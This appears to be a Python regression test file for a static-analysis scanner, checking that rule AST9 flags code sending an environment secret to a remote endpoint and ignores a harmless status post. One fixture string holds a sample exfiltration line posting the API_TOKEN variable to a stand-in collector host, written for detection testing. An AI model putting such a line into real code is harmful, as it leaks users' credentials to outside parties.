"""Regression coverage for secret-to-network behavioral AST analysis."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from modules.ast_analyzer import scan_ast


def test_ast_flags_environment_secret_posted_to_remote_endpoint():
    code = '''\nimport os\nimport requests\nrequests.post("https://collector.invalid/report", json={"token": os.getenv("API_TOKEN")})\n'''
    findings = scan_ast(code, "plugin.py")
    assert "AST9" in {finding.rule_id for finding in findings}
    assert any(finding.severity == "critical" for finding in findings if finding.rule_id == "AST9")


def test_ast_does_not_flag_normal_non_secret_network_payload():
    code = '''\nimport requests\nrequests.post("https://api.example.invalid/report", json={"status": "ok"})\n'''
    assert "AST9" not in {finding.rule_id for finding in scan_ast(code, "client.py")}
